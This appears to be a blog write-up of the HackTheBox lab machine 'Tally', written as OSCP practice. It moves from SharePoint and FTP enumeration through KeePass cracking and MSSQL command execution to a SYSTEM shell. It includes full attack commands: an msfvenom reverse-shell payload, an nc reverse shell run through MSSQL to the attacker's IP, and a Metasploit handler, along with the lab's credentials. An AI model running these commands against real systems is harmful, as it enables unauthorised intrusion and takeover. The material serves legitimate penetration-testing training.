---
layout: post
title: "tally"
date: 2025-09-15 
categories: OSCP Playlist
---
# tally

# Summary

- sharepoint site
- viewlsts.aspx site to show all site content
- find documents revealing ftp credentials
- keepass file from ftp server gaining a domain user
- smb share with unique binaries that has connection string to mssql
- mssql administrator to execute command on backend
- transferred meterpreter stager to Desktop, then execute it to get meterpreter shell
- getsystem exploiting SeImpersonatePrivilege with PrintSpoofer to get SYSTEM
- OR enumerate sarah Desktop to find scheduled ps script executed by admin
- Scheduled task script have loose permissions, allowing sarah to alter, can plant a reverse shell

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/tally 10.10.10.59

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
|_http-server-header: Microsoft-IIS/10.0
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info:
|   10.10.10.59:1433:
|     Target_Name: TALLY
|     NetBIOS_Domain_Name: TALLY
|     NetBIOS_Computer_Name: TALLY
|     DNS_Domain_Name: TALLY
|     DNS_Computer_Name: TALLY
|_    Product_Version: 10.0.14393
| ms-sql-info:
|   10.10.10.59:1433:
|     Version:
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-09-15T13:46:34
|_Not valid after:  2055-09-15T13:46:34
|_ssl-date: 2025-09-15T13:49:12+00:00; +43s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 43s, deviation: 0s, median: 42s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2025-09-15T13:48:56
|_  start_date: 2025-09-15T13:46:20
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

From the scan, we can tell it’s a Windows box from the open ports and services. Let’s first check FTP and whether it allows anonymous:

```bash
ftp 10.10.10.59
```

It does not. 

Now let’s check out smb:

```bash
nxc smb 10.10.10.59 -u '' -p '' --shares

SMB         10.10.10.59     445    TALLY            [*] Windows 10 / Server 2016 Build 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [-] TALLY\: STATUS_ACCESS_DENIED 
SMB         10.10.10.59     445    TALLY            [-] Error enumerating shares: Error occurs while reading from remote(104)

smbclient -N -L //10.10.10.59

session setup failed: NT_STATUS_ACCESS_DENIED
```

We get the computer and domain name. Let’s add TALLY to our /etc/hosts:

Let’s check port 80 now:

```bash
http://TALLY
```

![image.png]({{ site.baseurl }}/assets/tally/image.png)

There is a sign in button, we try default admin:admin, did not work. Let’s also see what the search button do:

![image.png]({{ site.baseurl }}/assets/tally/image%201.png)

If we look at the URL:

```bash
http://tally/_layouts/15/start.aspx#/_layouts/15/osssearchresults.aspx?u=http%3A%2F%2Ftally&k=something
```

The u parameter is holding the URL. Let’s see if it can query our attack box:

```bash
#attack box
nc -lnvp 80
```

And execute:

```bash
http://tally/_layouts/15/start.aspx#/_layouts/15/osssearchresults.aspx?u=http%3A%2F%2F10.10.16.7&k=something
```

We did not get a request.

Let’s fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://TALLY/FUZZ -ic

m                       [Status: 302, Size: 150, Words: 9, Lines: 2, Duration: 2075ms]
bin                     [Status: 301, Size: 140, Words: 9, Lines: 2, Duration: 22ms]
M                       [Status: 302, Size: 150, Words: 9, Lines: 2, Duration: 2805ms]
%20                     [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 98ms]
*checkout*              [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 45ms]
*docroot*               [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 27ms]
*                       [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 470ms]
%7Emike                 [Status: 500, Size: 25, Words: 4, Lines: 1, Duration: 47ms]
http%3A%2F%2Fwww        [Status: 200, Size: 7105, Words: 196, Lines: 140, Duration: 256ms]
http%3A                 [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 403ms]
q%26a                   [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 24ms]
**http%3a               [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 454ms]
%7Ejeff                 [Status: 500, Size: 25, Words: 4, Lines: 1, Duration: 208ms]
*http%3A                [Status: 200, Size: 7102, Words: 196, Lines: 140, Duration: 33ms]
                        [Status: 302, Size: 148, Words: 9, Lines: 2, Duration: 2166ms]
sitepages               [Status: 302, Size: 165, Words: 9, Lines: 2, Duration: 4165ms]

```

Visiting the site pages directory, we find this:

![image.png]({{ site.baseurl }}/assets/tally/image%202.png)

We also know we can see the Site Contents by visiting viewlsts.aspx:

```bash
http://tally/_layouts/15/viewlsts.aspx
```

![image.png]({{ site.baseurl }}/assets/tally/image%203.png)

We click on Documents, and we download a file called ftp-detail.docx:

```bash
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

Let’s log in to ftp:

```bash
ftp TALLY

ftp_user:UTDRSCH53c"$6hys
```

There are a lot of files here. In User/Tim, we find a keepass file. Let’s convert it to john and attempt to crack the master password. 

```bash
keepass2john tim.kdbx > tim.john
john --wordlist=/usr/share/wordlists/rockyou.txt tim.john

simplementeyo    (tim)
```

Let’s see if there are any passwords saved:

![image.png]({{ site.baseurl }}/assets/tally/image%204.png)

```bash
Finance:Acc0unting
```

Maybe this is a valid domain account. Let’s check:

```bash
nxc smb 10.10.10.59 -u Finance -p Acc0unting --shares

SMB         10.10.10.59     445    TALLY            [*] Windows 10 / Server 2016 Build 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\Finance:Acc0unting 
SMB         10.10.10.59     445    TALLY            [*] Enumerated shares
SMB         10.10.10.59     445    TALLY            Share           Permissions     Remark
SMB         10.10.10.59     445    TALLY            -----           -----------     ------
SMB         10.10.10.59     445    TALLY            ACCT            READ            
SMB         10.10.10.59     445    TALLY            ADMIN$                          Remote Admin
SMB         10.10.10.59     445    TALLY            C$                              Default share
SMB         10.10.10.59     445    TALLY            IPC$            READ            Remote IPC

```

We have permission to read the ACCT share. Let’s enumerate:

```bash
nxc smb 10.10.10.59 -u Finance -p Acc0unting --spider ACCT --regex .
```

There are a lot of files. Let’s just use smbclient and connect to the share:

```bash
smbclient //10.10.10.59/ACCT -U Finance
```

![image.png]({{ site.baseurl }}/assets/tally/image%205.png)

conn-info.txt:

```bash
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally
```

The note is telling us the details have changed for tally, let’s try regardless:

```bash
nxc mssql TALLY -u sa -p 'YE%TJC%&HYbe5Nw' --local-auth

#did not work

nxc mssql TALLY -u sa -p 'UTDRSCH53c"$6hys' --local-auth
```

Did not work. Back on the smb share, we also find an interesting file in zz_Migration/binaries/New folder/tester.exe. Since this seems abnormal, let’s download it and use strings on it:

```bash
strings -n 8 tester.exe

DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;

```

Seems we found the connect string:

```bash
sa:GWE3V65#6KFH93@4GWTG2G
```

Let’s see if it’s valid:

```bash
nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth

MSSQL       10.10.10.59     1433   TALLY            [*] Windows 10 / Server 2016 Build 14393 (name:TALLY) (domain:TALLY)
MSSQL       10.10.10.59     1433   TALLY            [+] TALLY\sa:GWE3V65#6KFH93@4GWTG2G (Pwn3d!)

```

It also seem like we are administrator on mssql, which means we have execution privileges. Let’s see what user we are:

```bash
nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami

MSSQL       10.10.10.59     1433   TALLY            tally\sarah
```

We are user sarah. Let’s keep enumerating:

```bash
nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami /priv

```

Let’s get a reverse shell now. Let’s get a meterpreter shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe
```

Uploading the file:

```bash
nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth --put-file /home/kali/htb_labs/tally/rev.exe C:/Users/Sarah/Desktop/rev.exe

#we can also do the same with nc

nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth --put-file /home/kali/htb_labs/tally/nc64.exe C:/temp/nc.exe
```

Let’s get a connection:

```bash
nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x "C:\temp\nc.exe 10.10.16.7 4444 -e cmd.exe"

nxc mssql TALLY -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x "C:\Users\Sarah\Desktop\rev.exe"
```

We now have a reverse shell:

![image.png]({{ site.baseurl }}/assets/tally/image%206.png)

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 4444
set payload windows/meterpreter/reverse_tcp
run
```

![image.png]({{ site.baseurl }}/assets/tally/image%207.png)

![image.png]({{ site.baseurl }}/assets/tally/image%208.png)

We now have SYSTEM. Let’s See if we can exploit this another way. 

We see in sarah’s desktop, a SPBestWarmUp.ps1. 

```bash
    # Manual input if auto detect failed
    if (!$pass) {
        $pass = Read-Host "Enter password for $user "
    }

        # Task Scheduler command
        $suffix += " -skipadmincheck"   #We do not need administrative rights on local machines to check the farm
        if ($allsites) {$suffix += " -allsites"}
        if ($skipsubwebs) {$suffix += " -skipsubwebs"}
        if ($skiplog) {$suffix += " -skiplog"}
        $cmd = "-ExecutionPolicy Bypass -File SPBestWarmUp.ps1" + $suffix

        # Target machines
        $machines = @()
        if ($installfarm -or $uninstall) {
                # Create farm wide on remote machines
                foreach ($srv in (Get-SPServer | Where-Object {$_.Role -ne "Invalid"})) {
                        $machines += $srv.Address
                }

```

Looks like a scirpt executed by task scheduler. Checking the SPBestWarmUp.xml:

```bash
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
 <SNIP>.....

  <Actions Context="Author">
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
  </Actions>
</Task>

```

Looks like the script executes the ps script as administrator every hour. Testing whether we have write permission to the ps1 script:

```bash
echo testing >  SPBestWarmUp.ps1
type SPBestWarmUp.ps1

testing
```

We can. We can either create a new admin user or plant a reverse shell.